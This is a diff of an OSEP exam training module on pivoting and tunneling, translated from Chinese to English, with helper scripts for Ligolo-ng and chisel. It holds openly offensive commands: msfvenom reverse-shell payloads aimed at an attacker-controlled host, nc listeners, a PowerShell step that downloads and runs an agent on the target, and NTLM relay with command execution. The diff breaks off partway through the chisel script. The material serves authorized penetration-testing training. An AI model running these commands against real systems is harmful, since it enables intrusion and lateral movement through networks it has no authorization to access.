@@ -2,130 +2,127 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# Module 08 — Pivoting
+# 08 · Pivoting & tunneling (port forwarding)
 
-Forward access is not a callback path. Put listeners on the pivot the target can reach.
-
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
-
-> 场景 34–35。横向移动的核心：**内网可达性 ≠ 你的可达性**，两条方向要分开想。
-> 配套脚本：`m08-ligolo-ng-setup.sh`、`m08-chisel-socks.sh`、`m08-port-forward.ps1`。
-> 关键词：`Ligolo-ng` `SSHUTTLE` `Autoroute` `Socks`。
+> Scenarios 34–35. Core of lateral movement: **internal reachability ≠ your reachability** — treat the two directions separately.
+> Lab files: `m08-ligolo-ng-setup.sh`, `m08-chisel-socks.sh`, `m08-port-forward.ps1`.
+> Keywords: `Ligolo-ng` `SSHUTTLE` `Autoroute` `Socks`.
 
 ---
 
-## 1. 两个场景的一句话结论
+## 1. One-line conclusions for both scenarios
 
-| 场景 | 问题 | 结论 |
+| Scenario | Problem | Conclusion |
 |---|---|---|
-| 34 | 内部网站只接受指定网段访问（Kali 直连被拒，已控 DEV 主机能访问） | 用**本地/动态转发**把"跳板的可达性"搬回 Kali；之后的 payload 一律走"与跳板回连路径一致"的地址 |
-| 35 | SOCKS 正向访问内网 SQL/域服务 OK，但目标**主动认证**（回连）到不了你的监听端 | 正向（你发起）与目标主动回连是**两条不同路径**；接收点要放在**目标可达的位置**（跳板/agent 所在机），再转发回 Kali 监听 |
+| 34 | Internal site only accepts a specific subnet (Kali direct connect refused; controlled DEV host can reach it) | Use **local/dynamic forwarding** to bring the pivot’s reachability back to Kali; afterward every payload address must match the **same callback path as the pivot** |
+| 35 | SOCKS forward access to internal SQL/domain services is OK, but target **active auth** (callback) never reaches your listener | Forward (you initiate) and target-initiated callback are **two different paths**; put the receive point where the **target can reach** (pivot/agent host), then forward back to the Kali listener |
 
-**不要做的事**：正向通了就把 Kali 的 `LHOST` 直接填进目标主动连接的参数里（UNC 路径、payload LHOST、认证回连地址）。目标到 Kali 的路不一定存在，这条错误浪费的时间最多。
+**Do not**: because forward works, put Kali’s `LHOST` into parameters for target-initiated connects (UNC paths, payload LHOST, auth callback addresses). The target→Kali path may not exist — this mistake burns the most time.
 
 ---
 
-## 2. 三种转发方向的速查（先想清楚再动手）
+## 2. Three forwarding directions (decide before you act)
 
-| 类型 | 谁 listen | 谁发起 | 典型命令 | 解决什么 |
+| Type | Who listens | Who initiates | Typical command | Solves |
 |---|---|---|---|---|
-| 本地转发 `-L` | 本机（Kali） | Kali | `ssh -L 127.0.0.1:8081:TARGET:8081 USER@PIVOT` | Kali 要访问内网服务（场景 34 主路径） |
-| 动态/SOCKS `-D` | 本机（Kali） | Kali | `ssh -D 1080 USER@PIVOT` / chisel / msf socks_proxy | 任意工具经代理访问内网（探测/枚举/正向连接） |
-| 远程/反连转发 `-R` / listener | 目标侧可达的机器（pivot/agent） | 目标主动连 | ligolo `listener_add`、netsh portproxy、`ssh -R` | 目标主动回连（反向 shell、NTLM 认证回连，场景 35） |
-| Ligolo 全子网 | 你的 Kali（tun 接口） | Kali | `ip route add 172.16.X.0/24 dev ligolo` | 整段内网像在本地一样访问 |
+| Local forward `-L` | Local (Kali) | Kali | `ssh -L 127.0.0.1:8081:TARGET:8081 USER@PIVOT` | Kali needs an internal service (scenario 34 main path) |
+| Dynamic/SOCKS `-D` | Local (Kali) | Kali | `ssh -D 1080 USER@PIVOT` / chisel / msf socks_proxy | Arbitrary tools via proxy into the internal net (probe/enum/forward connect) |
+| Remote/reverse forward `-R` / listener | Host reachable from the target (pivot/agent) | Target initiates | ligolo `listener_add`, netsh portproxy, `ssh -R` | Target-initiated callbacks (reverse shell, NTLM auth callback — scenario 35) |
+| Ligolo full subnet | Your Kali (tun iface) | Kali | `ip route add 172.16.X.0/24 dev ligolo` | Whole internal range as if local |
 
-**场景 35 的本质**：SOCKS 代理只承载 **Kali 发起的**连接。目标进程（SQL `xp_dirtree`、反向 shell、认证回调）发起连接时走的是**目标自己的路由**，SOCKS 帮不上忙——必须在目标可达的那台机器上开一个接收口，把连接通过隧道送回 Kali 的监听器。
+**Essence of scenario 35**: a SOCKS proxy only carries connections **initiated by Kali**. When a target process (SQL `xp_dirtree`, reverse shell, auth callback) connects, it uses the **target’s own routing** — SOCKS cannot help. You must open a receive port on a host the target can reach, then tunnel that connection back to the Kali listener.
 
-**端口与地址纪律**：所有阶段使用同一份地址/端口规划（见 `docs/00` 端口表，11601=Ligolo 代理、1080=SOCKS、8081=内网站点示例端口）；改动任一参数后立刻用无害连接Verify，不要假设。
+**Port/address discipline**: use one shared address/port plan across stages (see `docs/00` port table: 11601=Ligolo proxy, 1080=SOCKS, 8081=example internal web); after changing any parameter, verify with a harmless connect — never assume.
 
 ---
 
-## 3. 场景 34：内部网站只接受来自指定网段的访问
+## 3. Scenario 34: Internal site only accepts a specified subnet
 
-### Scenario回顾
-Kali 直连内部网站被拒绝（ACL 只放行指定网段），但已控的一台 DEV 网主机能访问该网站；网站（示例 web06:8081）后面还有上传或命令执行入口，最终目的是拿到入口并回连。
+### Situation
+Kali’s direct connect to an internal site is refused (ACL only allows a given subnet), but a controlled DEV-net host can reach it; behind the site (example web06:8081) there is upload or command execution; the end goal is entry plus callback.
 
-### 前提与假设
-- 已控制 DEV 主机，且 Kali → DEV 有可用路径（SSH 凭据 / 可执行 payload / Ligolo agent / chisel client）。
-- 内部网站 IP 已知（例 `172.16.X.50:8081`），且只允许 DEV 所在网段访问。
-- 网站上的上传/命令执行目标（web 主机）**不一定能回连 Kali**，回连目标要按它可达的路径设计（通常 = DEV 主机或 DEV 网段内你开的接收口）。
+### Assumptions
+- You control the DEV host, and Kali → DEV has a usable path (SSH creds / executable payload / Ligolo agent / chisel client).
+- Internal site IP is known (e.g. `172.16.X.50:8081`) and only the DEV subnet is allowed.
+- The web host behind upload/RCE **may not be able to callback to Kali**; design the callback for a path it can reach (usually = DEV host or a receive port you open in the DEV subnet).
 
-### 准备（attacker box侧）
+### Prepare (attacker)
 ```bash
-# 预放行：本地端口 8081（转发端口）、1080（SOCKS）、11601（ligolo）
+# Pre-reserve: local 8081 (forward port), 1080 (SOCKS), 11601 (ligolo)
 mkdir -p ~/osep/tools ~/osep/logs
-# 二进制放 ~/osep/tools：ligolo_proxy_linux / ligolo_agent_windows.exe / chisel / sshuttle（见 scripts/infra/m08-*-setup.sh 依赖说明）
+# Binaries under ~/osep/tools: ligolo_proxy_linux / ligolo_agent_windows.exe / chisel / sshuttle
+# (see m08-*-setup.sh dependency notes)
 ```
 
-### 执行步骤
-**Step 0 · 确认跳板出口**（决定用哪条隧道）：
+### Procedure
+**Step 0 · Confirm the pivot egress** (decides which tunnel):
 ```bash
-# DEV 主机上确认它确实能访问内网站点（在已有 shell / 隧道里执行）
+# On DEV, confirm it really reaches the internal site (in an existing shell / tunnel)
 curl -s -o /dev/null -w '%{http_code}\n' http://172.16.X.50:8081/
-# 确认 DEV 主机到 Kali 的出网能力（这决定回连方向怎么搭）
+# Confirm DEV → Kali egress (this decides how you build the callback direction)
 ```
 
-**Step 1 · 建立 Kali → DEV 的转发**（三选一，按手中条件）：
+**Step 1 · Build Kali → DEV forwarding** (pick one by what you have):
 
-方案 A：DEV 可 SSH（最省事）——本地转发 + 动态代理一起开：
+Option A: DEV has SSH (simplest) — local forward + dynamic proxy together:
 ```bash
 ssh -N -L 127.0.0.1:8081:172.16.X.50:8081 -D 1080 USER@DEV_IP
-# 浏览器/工具访问 http://127.0.0.1:8081（本地转发）；其他内网探测用 127.0.0.1:1080 SOCKS
+# Browser/tools: http://127.0.0.1:8081 (local forward); other internal probes via 127.0.0.1:1080 SOCKS
 ```
 
-方案 B：Ligolo-ng（DEV 能执行 agent，Windows/Linux 均可）——见 `m08-ligolo-ng-setup.sh`：
+Option B: Ligolo-ng (DEV can run the agent, Windows/Linux) — see `m08-ligolo-ng-setup.sh`:
 ```bash
-# Kali: proxy + tun + 路由（脚本的 proxy / route 子命令）
+# Kali: proxy + tun + route (script subcommands proxy / route)
 sudo ip route add 172.16.X.0/24 dev ligolo
-# proxy 控制台: session → start；之后 Kali 直接访问 http://172.16.X.50:8081
+# proxy console: session → start; then Kali hits http://172.16.X.50:8081 directly
 ```
-若内网站点就跑在 DEV 本机（另一常见形态），用 Ligolo 本地转发特殊 IP 即可，无需整段路由：
+If the internal site runs on DEV itself (another common shape), use Ligolo’s special local-forward IP — no full subnet route needed:
 ```bash
-sudo ip route add 240.0.0.1/32 dev ligolo   # 240.0.0.1 → DEV 本机回环
+sudo ip route add 240.0.0.1/32 dev ligolo   # 240.0.0.1 → DEV loopback
 curl http://240.0.0.1:8081/
 ```
 
-方案 C：chisel（DEV 能执行 chisel client）——见 `m08-chisel-socks.sh`。
+Option C: chisel (DEV can run chisel client) — see `m08-chisel-socks.sh`.
 
-**Step 2 · Verify内网站点可达 + 找上传/命令执行入口**：
+**Step 2 · Verify internal site reachability + find upload/RCE**:
 ```bash
-curl -s http://127.0.0.1:8081/ -o /dev/null -w '%{http_code}\n'   # 期望 200/302
-# 后续上传/命令执行交互都走这条已通的路径，不要换回 Kali 直连地址
+curl -s http://127.0.0.1:8081/ -o /dev/null -w '%{http_code}\n'   # expect 200/302
+# All later upload/RCE interaction stays on this working path — do not switch back to Kali’s direct address
 ```
 
-**Step 3 · 网站侧获得执行后，回连 payload 的地址设计**（关键）：web 主机回连目标 = **DEV 主机上你能开的接收口**，经隧道送回 Kali 监听。用 Ligolo 反连 listener 模板：
+**Step 3 · After execution on the web side, design the callback address** (critical): web-host callback target = **a receive port you can open on DEV**, forwarded through the tunnel to the Kali listener. Ligolo reverse-listener template:
 ```
-# Kali 终端 1：监听真 shell
+# Kali terminal 1: real shell listener
 rlwrap -cAr nc -lvnp 4444
-# Kali 终端 2（ligolo proxy 控制台）：让 agent(DEV) 在 0.0.0.0:PORT 接收、转发回 Kali 127.0.0.1:4444
+# Kali terminal 2 (ligolo proxy console): agent(DEV) listens 0.0.0.0:PORT, forwards to Kali 127.0.0.1:4444
 listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4444 --tcp
 listener_list
-# 生成的 payload LHOST=DEV 主机内网 IP，LPORT=4445（绝不能填 Kali IP）
+# Generated payload LHOST=DEV internal IP, LPORT=4445 (never Kali IP)
 #   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<DEV_IP> LPORT=4445 -f exe -o rev.exe
-# 网站侧执行后：web 主机连 DEV:4445 → ligolo 隧道 → Kali 127.0.0.1:4444
+# After web-side exec: web host → DEV:4445 → ligolo tunnel → Kali 127.0.0.1:4444
 ```
-Windows 形态的 DEV 跳板也能用 `m08-port-forward.ps1` 的 portproxy 做等价转发。
+A Windows DEV pivot can also use `m08-port-forward.ps1` portproxy for the equivalent forward.
 
-### 用到的脚本
-- `m08-ligolo-ng-setup.sh`（proxy/agent/路由/reverse 子命令）
-- `m08-chisel-socks.sh`（备选转发 + proxychains）
-- `m08-port-forward.ps1`（DEV 是 Windows 时的 netsh portproxy）
+### Lab files
+- `m08-ligolo-ng-setup.sh` (proxy/agent/route/reverse subcommands)
+- `m08-chisel-socks.sh` (alternate forward + proxychains)
+- `m08-port-forward.ps1` (netsh portproxy when DEV is Windows)
 
 ### Verify
-1. `curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/` 返回非拒绝状态码。
-2. 在网站入口执行无害回连（如 `nc <DEV_IP> 4445` / 触发一次下载）确认整条链路，再上真 payload。
-3. 回连拿到 shell 后立即 `whoami`、`ipconfig /all`——确认拿到的是 **web 主机**而非跳板。
+1. `curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/` returns a non-refuse status.
+2. From the web entry, fire a harmless callback (e.g. `nc <DEV_IP> 4445` / one download) to confirm the full chain before the real payload.
+3. After the reverse shell: immediately `whoami`, `ipconfig /all` — confirm you landed on the **web host**, not the pivot.
 
-### 失败分支与备选
-1. **8081 本地端口被占** → 换 `127.0.0.1:18081`，URL 同步改，别抢 11601/1080。
-2. **ssh 方案不通（无凭据/防火墙）** → 切 Ligolo 或 chisel，只要 DEV 能执行 agent 即可，不依赖 SSH 服务。
-3. **网站还连不上** → 在 DEV 上先 `curl` Verify网站真可达；可能是 ACL 细化到端口/协议，换 http→https 或换目标端口试试。
-4. **回连 payload 到不了 DEV:4445** → 先用无害 TCP 测试（网站侧 `nc` 或命令注入 `ping`）确认 web→DEV 通路；不通就在 DEV 同网段再放一个 agent/listener 作中继。
+### If it fails
+1. **Local 8081 already in use** → switch to `127.0.0.1:18081`, update the URL; do not steal 11601/1080.
+2. **SSH option unavailable (no creds/firewall)** → switch to Ligolo or chisel; as long as DEV can run an agent, you do not need an SSH service.
+3. **Site still unreachable** → on DEV first `curl` to prove the site is reachable; ACL may be port/protocol-specific — try http→https or another target port.
+4. **Callback payload never reaches DEV:4445** → harmless TCP test first (web-side `nc` or command injection `ping`) to confirm web→DEV; if not, place another agent/listener in the same DEV subnet as a relay.
 
-### 考试注意 OPSEC
-- Ligolo 用 `-selfcert`（明文通道）：考试环境可接受，别浪费时间做证书；但**生产/报告不要提加密**。
-- 每个转发端口只开一个监听；用 `listener_list` / `ss -tlnp` 确认没有重复占用。
-- 先无害Verify再上 payload——端口转发链路里少一个Verify，错误会叠加（地址错 + 端口错 + 协议错一起排查最费时）。
+### Exam notes / OPSEC
+- Ligolo with `-selfcert` (cleartext channel): fine for the exam; do not burn time on certs; **do not claim encryption in production/report writeups**.
+- One listener per forward port; confirm with `listener_list` / `ss -tlnp` that nothing is double-bound.
+- Harmless verify before real payload — missing one check in a forward chain stacks errors (wrong address + wrong port + wrong protocol is the slowest triage).
 
 ---
 
@@ -133,19 +130,19 @@ Windows 形态的 DEV 跳板也能用 `m08-port-forward.ps1` 的 portproxy 做�
 
 ````bash
 #!/usr/bin/env bash
-# 用途：Ligolo-ng 全流程助手——proxy 启动、tun/路由、agent 投放、反连转发、文件传输、双层穿透
-# 场景：M08 场景 34/35（内网站点 ACL 转发、目标主动回连收口），见 docs/08-pivoting-tunneling.md
-# 依赖：ligolo_proxy_linux / ligolo_agent（放 ~/osep/tools）、sudo（ip tuntap/route）、python3（投递 http.server）
-# 使用：bash m08-ligolo-ng-setup.sh <subcommand> [参数]
-#       proxy            [PORT]              # 创建 tun 接口并启动 proxy(-selfcert)
-#       agent            [LHOST] [PORT]      # Kali 起 HTTP 投递 + 打印目标侧下载/运行命令
-#       route            NETWORK[/24]        # 整段子网路由（例 172.16.40.0/24）
-#       route-local                          # 240.0.0.1/32 → agent 所在机回环（站点跑在 agent 本机时）
-#       reverse          AGENT_PORT KALI_PORT# 目标主动回连：打印 listener_add + payload 地址模板
-#       file             AGENT_PORT KALI_PORT FILE  # 经隧道把 Kali 上的文件传给目标
-#       double           SECOND_TUN NETWORK  # 第二层 tun + 转发 11601（双层穿透）
-# 占位符：LHOST=攻击机可达 IP；PORT=proxy 端口(默认11601)；AGENT_PORT=agent 侧接收口；KALI_PORT=Kali 监听口
-# 测试状态：已通过 bash -n（本机无 ligolo 二进制/无 tun 权限，未实测）；交互命令需在 proxy 控制台手工执行
+# Purpose: Ligolo-ng end-to-end helper — start proxy, tun/route, agent delivery, reverse forward, file transfer, double pivot
+# Scenario: M08 scenarios 34/35 (internal ACL forward, target-initiated callback sink) — see docs/08-pivoting-tunneling.md
+# Depends: ligolo_proxy_linux / ligolo_agent under ~/osep/tools, sudo (ip tuntap/route), python3 (http.server delivery)
+# Usage: bash m08-ligolo-ng-setup.sh <subcommand> [args]
+#       proxy            [PORT]              # create tun iface and start proxy (-selfcert)
+#       agent            [LHOST] [PORT]      # Kali HTTP delivery + print target download/run commands
+#       route            NETWORK[/24]        # full subnet route (e.g. 172.16.40.0/24)
+#       route-local                          # 240.0.0.1/32 → agent host loopback (site on agent itself)
+#       reverse          AGENT_PORT KALI_PORT# target-initiated callback: print listener_add + payload address template
+#       file             AGENT_PORT KALI_PORT FILE  # send a Kali file to the target via the tunnel
+#       double           SECOND_TUN NETWORK  # second tun + forward 11601 (double pivot)
+# Placeholders: LHOST=attacker-reachable IP; PORT=proxy port (default 11601); AGENT_PORT=agent-side receive; KALI_PORT=Kali listener
+# Test status: passed bash -n (no ligolo binary / no tun rights here — not runtime-tested); interactive commands must be run by hand in the proxy console
 set -euo pipefail
 
 TOOLS="${HOME}/osep/tools"
@@ -160,88 +157,88 @@ warn(){ printf '\033[1;33m[!] %s\033[0m\n' "$*" >&2; }
 
 usage(){ sed -n '5,17p' "$0" | sed 's/^# //'; exit 1; }
 
-ensure_bin(){ [[ -x "$1" ]] || { warn "缺少 $1 —— 先下载并 chmod +x（放 ~/osep/tools）"; exit 1; }; }
+ensure_bin(){ [[ -x "$1" ]] || { warn "missing $1 — download and chmod +x first (under ~/osep/tools)"; exit 1; }; }
 
-# 创建/拉起 tun 接口
+# Create / bring up tun iface
 tun_up(){
   local name="$1" user; user="$(id -un)"
-  sudo ip tuntap add user "$user" mode tun "$name" 2>/dev/null || true   # 已存在时报错可忽略
+  sudo ip tuntap add user "$user" mode tun "$name" 2>/dev/null || true   # ignore if already exists
   sudo ip link set "$name" up
-  ip link show "$name" >/dev/null 2>&1 || { warn "tun 接口 $name 未就绪"; exit 1; }
+  ip link show "$name" >/dev/null 2>&1 || { warn "tun iface $name not ready"; exit 1; }
 }
 
 cmd_proxy(){
   local port="${1:-$KALI_PORT_DEFAULT}"
   ensure_bin "$PROXY_BIN"
   tun_up "$TUN"
-  say "启动 Ligolo proxy (-selfcert, 明文通道，考试环境够用)，端口 $port"
-  say "之后在 proxy 控制台输入:  session → start"
-  [[ "$port" != "$KALI_PORT_DEFAULT" ]] && info "agent 连接端口需同步为 $port"
+  say "starting Ligolo proxy (-selfcert, cleartext channel — enough for exam), port $port"
+  say "then in proxy console:  session → start"
+  [[ "$port" != "$KALI_PORT_DEFAULT" ]] && info "agent connect port must match $port"
   "$PROXY_BIN" -selfcert -port "$port"
 }
 
 cmd_agent(){
   local lhost="${1:-}"; local port="${2:-$KALI_PORT_DEFAULT}"
-  [[ -z "$lhost" ]] && { warn "用法: $0 agent LHOST [PORT]"; exit 1; }
-  [[ -f "$AGENT_BIN" ]] || { warn "缺少 $AGENT_BIN"; exit 1; }
-  (cd "$TOOLS" && python3 -m http.server 80) &   # 投递目录 = ~/osep/tools
-  say "HTTP 投递已在 80 端口（日志跟随当前终端）"
-  say "目标侧（PowerShell）执行:"
+  [[ -z "$lhost" ]] && { warn "usage: $0 agent LHOST [PORT]"; exit 1; }
+  [[ -f "$AGENT_BIN" ]] || { warn "missing $AGENT_BIN"; exit 1; }
+  (cd "$TOOLS" && python3 -m http.server 80) &   # delivery dir = ~/osep/tools
+  say "HTTP delivery on port 80 (logs follow this terminal)"
+  say "on target (PowerShell) run:"
   info "iwr -uri http://${lhost}/ligolo_agent_windows.exe -UseBasicParsing -OutFile ligolo_agent.exe"
   info ".\ligolo_agent.exe -connect ${lhost}:${port} -ignore-cert"
-  say "agent 上线后在 proxy 控制台:  session → start"
+  say "after agent checks in, proxy console:  session → start"
 }
 
 cmd_route(){
-  local net="${1:-}"; [[ -z "$net" ]] && { warn "用法: $0 route NETWORK/24"; exit 1; }
+  local net="${1:-}"; [[ -z "$net" ]] && { warn "usage: $0 route NETWORK/24"; exit 1; }
   tun_up "$TUN"
   sudo ip route add "$net" dev "$TUN" 2>/dev/null || true
-  say "路由已加（重复执行会忽略）：$net dev $TUN"
-  info "验证: ip route list | grep $TUN"
-  say "再回 proxy 控制台确认 session 已 start，之后 Kali 可直接访问该子网"
+  say "route added (repeat is ignored): $net dev $TUN"
+  info "verify: ip route list | grep $TUN"
+  say "back in proxy console confirm session is started — then Kali can hit that subnet directly"
 }
 
 cmd_route_local(){
   tun_up "$TUN"
   sudo ip route add 240.0.0.1/32 dev "$TUN" 2>/dev/null || true
-  say "240.0.0.1/32 → agent 所在机回环（Ligolo 本地端口转发特殊 IP）"
-  info "站点跑在 agent 本机时直接: curl http://240.0.0.1:8081/ 或 nmap 240.0.0.1 -sV"
+  say "240.0.0.1/32 → agent host loopback (Ligolo local port-forward special IP)"
+  info "when the site is on the agent host: curl http://240.0.0.1:8081/ or nmap 240.0.0.1 -sV"
 }
 
 cmd_reverse(){
   local agent_port="${1:-}"; local kali_port="${2:-}"
-  [[ -z "$agent_port" || -z "$kali_port" ]] && { warn "用法: $0 reverse AGENT_PORT KALI_PORT"; exit 1; }
-  say "目标主动回连模板（场景 35 收口用）——先起 Kali 真监听:"
+  [[ -z "$agent_port" || -z "$kali_port" ]] && { warn "usage: $0 reverse AGENT_PORT KALI_PORT"; exit 1; }
+  say "target-initiated callback template (scenario 35 sink) — start the real Kali listener first:"
   info "rlwrap -cAr nc -lvnp ${kali_port}"
-  say "再在 proxy 控制台执行（agent 在 0.0.0.0:AGENT_PORT 接收，转发回 Kali 127.0.0.1:KALI_PORT）:"
+  say "then in proxy console (agent listens 0.0.0.0:AGENT_PORT, forwards to Kali 127.0.0.1:KALI_PORT):"
   info "listener_add --addr 0.0.0.0:${agent_port} --to 127.0.0.1:${kali_port} --tcp"
   info "listener_list"
-  say "payload/触发参数里的地址 = agent 所在机内网 IP + ${agent_port}（绝不能填 Kali 的公网 IP）:"
+  say "addresses in payload/trigger params = agent host internal IP + ${agent_port} (never Kali public IP):"
   info "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AGENT_IP> LPORT=${agent_port} -f exe -o rev.exe"
 }
 
 cmd_file(){
   local agent_port="${1:-}"; local kali_port="${2:-}"; local fname="${3:-}"
-  [[ -z "$fname" ]] && { warn "用法: $0 file AGENT_PORT KALI_PORT FILE"; exit 1; }
-  say "proxy 控制台执行:"
+  [[ -z "$fname" ]] && { warn "usage: $0 file AGENT_PORT KALI_PORT FILE"; exit 1; }
+  say "in proxy console run:"
   info "listener_add --addr 0.0.0.0:${agent_port} --to 127.0.0.1:${kali_port} --tcp"
-  say "Kali 侧提供文件（在文件所在目录）:"
+  say "on Kali serve the file (from its directory):"
   info "python3 -m http.server ${kali_port}"
-  say "目标侧下载（URL 里的 IP = agent 所在机内网 IP）:"
+  say "on target download (IP in URL = agent host internal IP):"
   info "Invoke-WebRequest -Uri \"http://<AGENT_IP>:${agent_port}/${fname}\" -OutFile ${fname}"
 }
 
 cmd_double(){
   local tun2="${1:-ligolo_double}"; local net2="${2:-}"
-  [[ -z "$net2" ]] && { warn "用法: $0 double SECOND_TUN NETWORK/24"; exit 1; }
-  say "双层穿透（第二台 agent 经第一跳接入）"
+  [[ -z "$net2" ]] && { warn "usage: $0 double SECOND_TUN NETWORK/24"; exit 1; }
+  say "double pivot (second agent joins via first hop)"
   tun_up "$tun2"
-  say "1) proxy 控制台（第一跳会话内）执行:"
+  say "1) proxy console (inside first-hop session):"
   info "listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp"
   info "listener_list"
-  say "2) 第二台目标（第二层主机）agent 连接地址 = 第一跳 agent 机器 IP:"
+  say "2) second target agent connect address = first-hop agent host IP:"
   info "ligolo_agent.exe -connect <FIRST_PIVOT_IP>:11601 -ignore-cert"
-  say "3) 第二跳会话上线后: session(切到第二跳) → start；Kali 加第二层路由:"
+  say "3) after second-hop session is up: session (switch to second hop) → start; Kali adds second-layer route:"
   info "sudo ip route add ${net2} dev ${tun2}"
   info "ip route list | grep ${tun2}"
 }
@@ -263,18 +260,18 @@ esac
 
 ````bash
 #!/usr/bin/env bash
-# 用途：chisel 隧道备选（Ligolo 不可用时的 SOCKS/单服务转发/反连收口）+ proxychains 配置助手
-# 场景：M08 场景 34（内网 Web 经跳板访问）与场景 35（目标主动回连收口），见 docs/08-pivoting-tunneling.md
-# 依赖：chisel（Kali 侧 ~/osep/tools/chisel，Linux 版；Windows 版投到目标）、sudo（改 /etc/proxychains4.conf 用）
-# 使用：bash m08-chisel-socks.sh <subcommand> [参数]
-#       server            [PORT]              # Kali 起 chisel server --reverse（默认 8080）
-#       client-socks      SERVER_ADDR         # 打印目标侧命令: 开 R:1080:socks → Kali 127.0.0.1:1080 出口在目标
-#       client-forward    SERVER_ADDR LKALI TARGET TPORT  # 打印目标侧命令: Kali 本机 LKALI 口→ 目标 TARGET:TPORT
-#       rev-serve         [PORT]              # 场景35: 目标可达的机器上起 chisel server（接收端）
-#       rev-client        PIVOT_ADDR PORT KALI_PORT  # 场景35: Kali 侧 client R:PORT:127.0.0.1:KALI_PORT
-#       proxychains                             # 往 /etc/proxychains4.conf 加 socks5 行并显示用法
-# 占位符：SERVER_ADDR=Kali 的 chisel server 地址(IP:PORT)；PIVOT_ADDR=场景35接收端机器地址
-# 测试状态：已通过 bash -n（本机无 chisel，未实测）；chisel R: 的监听端在 server 侧、出口在 client 侧
+# Purpose: chisel tunnel fallback (SOCKS / single-service forward / reverse sink when Ligolo unavailable) + proxychains helper
+# Scenario: M08 scenario 34 (internal web via pivot) and 35 (target-initiated callback sink) — see docs/08-pivoting-tunneling.md
+# Depends: chisel (Kali ~/osep/tools/chisel Linux build; Windows build delivered to target), sudo (to edit /etc/proxychains4.conf)
+# Usage: bash m08-chisel-socks.sh <subcommand> [args]
+#       server            [PORT]              # Kali chisel server --reverse (default 8080)
+#       client-socks      SERVER_ADDR         # print target cmd: R:1080:socks → Kali 127.0.0.1:1080 egress is the target
+#       client-forward    SERVER_ADDR LKALI TARGET TPORT  # print target cmd: Kali local LKALI → TARGET:TPORT
+#       rev-serve         [PORT]              # scenario 35: start chisel server on a target-reachable host (receive side)
+#       rev-client        PIVOT_ADDR PORT KALI_PORT  # scenario 35: Kali client R:PORT:127.0.0.1:KALI_PORT
+#       proxychains                             # append socks5 line to /etc/proxychains4.conf and show usage
+# Placeholders: SERVER_ADDR=Kali chisel server (IP:PORT); PIVOT_ADDR=scenario-35 receive-side host
+# Test status: passed bash -n (no chisel here — not runtime-tested); for chisel R: the listener is on the server side, egress on the client side
 set -euo pipefail
 
 TOOLS="${HOME}/osep/tools"
@@ -286,63 +283,63 @@ warn(){ printf '\033[1;33m[!] %s\033[0m\n' "$*" >&2; }
 
 usage(){ sed -n '5,15p' "$0" | sed 's/^# //'; exit 1; }
 
-# 拓扑说明（记牢再动手，方向错了等于没隧道）：
-#   L:xx 监听在 chisel client；R:xx 监听在 chisel server。
-#   R: 的出口在 client 侧 —— 所以 Kali 做 server、目标做 client 时，
-#   R:socks / R:PORT:TARGET:PORT 让 Kali 侧多出可用的口，流量从目标侧发出。
+# Topology (memorize before acting — wrong direction = no tunnel):
+#   L:xx listens on the chisel client; R:xx listens on the chisel server.
+#   R: egress is on the client side — so when Kali is server and the target is client,
+#   R:socks / R:PORT:TARGET:PORT gives Kali usable ports with traffic exiting from the target.
 
 cmd_server(){
   local port="${1:-8080}"
-  [[ -x "$CHISEL" ]] || { warn "缺少 $CHISEL"; exit 1; }
-  say "Kali 侧 chisel server(--reverse)，端口 $port"
+  [[ -x "$CHISEL" ]] || { warn "missing $CHISEL"; exit 1; }
+  say "Kali chisel server (--reverse), port $port"
   "$CHISEL" server -p "$port" --reverse
 }
 
 cmd_client_socks(){
-  local addr="${1:-}"; [[ -z "$addr" ]] && { warn "用法: $0 client-socks KALI_SERVER:PORT"; exit 1; }
-  say "目标侧执行（目标需能出网连 ${addr}）:"
+  local addr="${1:-}"; [[ -z "$addr" ]] && { warn "usage: $0 client-socks KALI_SERVER:PORT"; exit 1; }
+  say "on target (target must egress to ${addr}):"
   info "chisel.exe client ${addr} R:1080:socks"
-  say "Kali 侧 proxychains 走 127.0.0.1:1080 访问内网（出口 = 目标机）:"
-  info "bash $0 proxychains    # 自动写入 socks5 配置后:"
+  say "on Kali, proxychains via 127.0.0.1:1080 into the internal net (egress = target):"
+  info "bash $0 proxychains    # after auto-writing socks5 config:"
   info "proxychains4 -q netexec mssql targets.txt -u 'USER' -p 'PASS'"
 }
 
 cmd_client_forward(){
   local addr="${1:-}"; local lport="${2:-}"; local target="${3:-}"; local tport="${4:-}"
-  [[ -z "$tport" ]] && { warn "用法: $0 client-forward KALI_SERVER:PORT KALI_LPORT TARGET TPORT"; exit 1; }
-  say "目标侧执行（Kali 访问 127.0.0.1:${lport} → ${target}:${tport}，场景 34 单服务转发）:"
+  [[ -z "$tport" ]] && { warn "usage: $0 client-forward KALI_SERVER:PORT KALI_LPORT TARGET TPORT"; exit 1; }
+  say "on target (Kali hits 127.0.0.1:${lport} → ${target}:${tport}, scenario 34 single-service forward):"
   info "chisel.exe client ${addr} R:${lport}:${target}:${tport}"
-  say "Kali 侧验证:"
+  say "Kali verify:"
   info "curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:${lport}/"
 }
 
 cmd_rev_serve(){
   local port="${1:-9310}"
-  say "场景 35 接收端：在【目标可达的那台机器】（如内网跳板）起 chisel server:"
+  say "scenario 35 receive side: on the [host the target can reach] (e.g. internal pivot) start chisel server:"
   info "./chisel server -p ${port}"
-  say "确保这台机器能被目标连到（同网段/防火墙放行 ${port}）"
+  say "ensure that host is reachable from the target (same subnet / firewall allows ${port})"
 }
 
 cmd_rev_client(){
   local paddr="${1:-}"; local lport="${2:-}"; local kport="${3:-}"
-  [[ -z "$kport" ]] && { warn "用法: $0 rev-client PIVOT_ADDR LISTENPORT KALI_PORT"; exit 1; }
-  say "Kali 侧先起认证/回连接收端（root，445 需先停 smbd）:"
-  info "sudo ntlmrelayx.py -t smb://TARGET -smb2support -c 'whoami'     # 监听 ${kport}"
-  say "Kali 侧执行（client 连接收端机器，R: 让接收端机器在 ${lport} 监听并转发回 Kali ${kport}）:"
